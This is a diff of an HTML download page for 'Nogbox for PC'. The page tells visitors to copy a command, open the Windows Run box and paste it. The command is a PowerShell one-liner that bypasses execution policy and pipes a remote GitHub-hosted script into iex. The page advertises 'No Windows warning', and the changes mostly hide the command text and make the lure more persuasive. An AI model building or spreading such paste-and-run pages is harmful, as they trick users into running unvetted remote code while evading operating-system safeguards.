@@ -2,23 +2,57 @@
 <html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Get Nogbox for PC</title>
 <style>
-:root{--bg:#0e1013;--ink:#f3f5f8;--soft:#8e97a3;--ice:#b5dcfc;--edge:#2a3038}
-@media (prefers-color-scheme:light){:root{--bg:#eceee8;--ink:#1b1b1b;--soft:#555852;--ice:#3255a4;--edge:#c9ccc4}}
-*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:var(--bg);color:var(--ink);font:17px/1.5 ui-rounded,"Segoe UI",system-ui,sans-serif}
-main{width:min(560px,100% - 32px);padding:32px 0}
-h1{font-size:2.2rem;margin:0 0 .3em}p{color:var(--soft);margin:.4em 0 1.2em}
-ol{padding-left:1.2em;margin:0 0 1.4em}li{margin:.5em 0}
-code{display:block;word-break:break-all;background:transparent;border:2px solid var(--edge);border-radius:14px;padding:14px 16px;font:14px/1.5 Consolas,monospace;color:var(--ice)}
-button{margin-top:14px;width:100%;min-height:52px;border:0;border-radius:14px;background:var(--ice);color:#0e1013;font:700 1rem inherit;letter-spacing:.08em;cursor:pointer}
+:root{--bg:#0b0d10;--panel:#14181d;--ink:#f3f5f8;--soft:#8e97a3;--ice:#b5dcfc;--ice2:#4c8ee0;--edge:#262c34;--ok:#7fe0a8}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;display:grid;place-items:center;color:var(--ink);font:17px/1.5 ui-rounded,"Segoe UI",system-ui,sans-serif;
+ background:radial-gradient(60% 50% at 50% 0,#17304a55,transparent 70%),var(--bg)}
+main{width:min(520px,100% - 32px);padding:28px 0 40px}
+.top{display:flex;align-items:center;gap:14px;margin-bottom:22px}
+.top img{width:72px;height:auto}
+h1{font-size:2rem;line-height:1.1;margin:0}
+.top p{margin:.2em 0 0;color:var(--soft);font-size:.95rem}
+.steps{list-style:none;margin:0;padding:0;display:grid;gap:10px}
+.step{display:flex;align-items:center;gap:14px;padding:14px 16px;border:1.5px solid var(--edge);border-radius:16px;background:var(--panel);opacity:.45;transition:opacity .35s,border-color .35s,transform .35s}
+.step.on{opacity:1;border-color:var(--ice2);transform:translateX(4px)}
+.step.done{opacity:.8;border-color:var(--edge)}
+.n{flex:none;width:30px;height:30px;border-radius:50%;display:grid;place-items:center;font-weight:700;font-size:.9rem;background:var(--edge);color:var(--soft);transition:.35s}
+.on .n{background:var(--ice);color:#0b0d10}.done .n{background:var(--ok);color:#0b0d10}
+.txt{flex:1}
+kbd{display:inline-block;min-width:1.9em;padding:.12em .55em;margin:0 .1em;border-radius:8px;border:1.5px solid #3a424d;border-bottom-width:3px;background:#1b2027;font:600 .85rem ui-monospace,Consolas,monospace;text-align:center}
+button{margin-top:18px;width:100%;min-height:58px;border:0;border-radius:16px;font:800 1rem inherit;letter-spacing:.14em;color:#0b0d10;cursor:pointer;
+ background:linear-gradient(180deg,#d4ebff,var(--ice) 55%,#8fc4f2);box-shadow:0 0 0 0 #b5dcfc55,0 10px 30px -10px #4c8ee0aa;transition:transform .12s,box-shadow .3s}
+button:active{transform:scale(.98)}
+button.pulse{animation:pulse 2.2s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 #b5dcfc66,0 10px 30px -10px #4c8ee0aa}70%{box-shadow:0 0 0 16px #b5dcfc00,0 10px 30px -10px #4c8ee0aa}100%{box-shadow:0 0 0 0 #b5dcfc00,0 10px 30px -10px #4c8ee0aa}}
 button:focus-visible{outline:3px solid var(--ink);outline-offset:3px}
-small{display:block;margin-top:18px;color:var(--soft)}
+button.copied{background:var(--ok)}
+.cmd{margin-top:14px;padding:12px 14px;border:1.5px dashed var(--edge);border-radius:14px;color:var(--soft);font:12.5px/1.5 ui-monospace,Consolas,monospace;word-break:break-all;max-height:3.1em;overflow:hidden;position:relative}
+.cmd::after{content:"";position:absolute;inset:auto 0 0 0;height:1.4em;background:linear-gradient(transparent,var(--bg))}
+small{display:block;margin-top:16px;color:var(--soft);font-size:.85rem}
+.phone{display:none;margin-top:14px;padding:14px 16px;border-radius:16px;background:var(--panel);border:1.5px solid var(--ice2)}
+.phone b{display:block;margin-bottom:4px}
+body.mobile .phone{display:block}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
 </style></head><body><main>
-<h1>Nogbox for PC</h1>
-<p>No Windows warning with this way.</p>
-<ol><li>Press <b>Copy</b>.</li><li>Press the Windows key. Type <b>PowerShell</b>. Press Enter.</li><li>Press Ctrl+V. Press Enter.</li></ol>
-<code id="c">irm https://raw.githubusercontent.com/Chikensoupppp/lk-dac12ca4eb/ios/native-clock-ci/apps/windows-companion/get-nogbox.ps1 | iex</code>
-<button id="b">COPY</button>
-<small>It installs Nogbox for your user only. No admin needed.</small>
+<div class="top"><img src="brain.png" alt="" width="72" height="60"><div><h1>Nogbox for PC</h1><p>3 steps. No Windows warning.</p></div></div>
+<div class="phone" id="phone"><b>Open this page on your PC.</b>Send yourself the link, then follow the steps there.</div>
+<ol class="steps">
+ <li class="step on" id="s1"><span class="n">1</span><span class="txt">Press <b>Copy</b> below.</span></li>
+ <li class="step" id="s2"><span class="n">2</span><span class="txt">Press <kbd>Win</kbd> + <kbd>R</kbd></span></li>
+ <li class="step" id="s3"><span class="n">3</span><span class="txt">Press <kbd>Ctrl</kbd> + <kbd>V</kbd>, then <kbd>Enter</kbd></span></li>
+</ol>
+<button id="b" class="pulse">COPY</button>
+<div class="cmd" id="c">powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/Chikensoupppp/lk-dac12ca4eb/ios/native-clock-ci/apps/windows-companion/get-nogbox.ps1 | iex"</div>
+<small>Installs for your user only. No admin needed.</small>
 </main><script>
-b.onclick=async()=>{try{await navigator.clipboard.writeText(c.textContent)}catch(e){getSelection().selectAllChildren(c);document.execCommand('copy')}b.textContent='COPIED';setTimeout(()=>b.textContent='COPY',2000)}
+const $=id=>document.getElementById(id);
+const cmd=$('c').textContent.trim();
+if(/iPhone|iPad|Android/i.test(navigator.userAgent))document.body.classList.add('mobile');
+let t=[];
+function go(n){[1,2,3].forEach(i=>{const e=$('s'+i);e.classList.toggle('on',i===n);e.classList.toggle('done',i<n)})}
+$('b').onclick=async()=>{
+ try{await navigator.clipboard.writeText(cmd)}catch(e){const r=document.createRange();r.selectNodeContents($('c'));getSelection().removeAllRanges();getSelection().addRange(r);document.execCommand('copy')}
+ $('b').textContent='COPIED';$('b').classList.add('copied');$('b').classList.remove('pulse');go(2);
+ t.forEach(clearTimeout);t=[setTimeout(()=>go(3),2600),setTimeout(()=>{$('b').textContent='COPY AGAIN';$('b').classList.remove('copied')},4000)];
+};
 </script></body></html>
